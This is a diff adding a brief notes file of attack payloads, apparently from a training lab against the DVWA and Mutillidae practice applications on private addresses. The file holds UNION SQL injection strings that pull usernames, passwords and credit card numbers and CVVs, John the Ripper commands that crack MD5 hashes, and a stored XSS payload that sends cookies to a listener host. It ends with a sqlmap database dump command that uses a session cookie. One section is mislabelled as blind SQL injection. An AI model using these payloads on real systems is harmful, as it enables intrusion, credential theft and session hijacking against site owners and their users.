@@ -1,0 +1,27 @@
+Script usati / Vulnerability: SQL Injection (Blind)
+
+%' and 1=0 union select null, table_name from information_schema.tables #
+
+%' and 1=0 union select table_name, column_name from information_schema.columns where table_name = 'users' #
+
+%' and 1=0 union select table_schema, table_name from information_schema.tables #
+
+%' union select ccnumber, expiration from owasp10.credit_cards#
+
+%' union select ccnumber, ccv from owasp10.credit_cards#
+
+%' union select user, password from users#
+
+In CMD:
+john -w=/usr/share/nmap/nselib/data/passwords.lst --format=Raw-MD5 /home/kali/Desktop/S6_L5.txt
+
+john --show --format=Raw-MD5 /home/kali/Desktop/S6_L5.txt
+
+================================================
+
+Script usati / Vulnerability: SQL Injection (Blind)
+
+<script>window.location="http://192.168.50.100:12345/?cookie"+document.cookie</script>
+
+In CMD:
+sqlmap -u "http://192.168.50.101/dvwa/vulnerabilities/xss_s" --cookie "PHPSESSID=be174524f68cc51692eb249fe1924776" -dump --batch
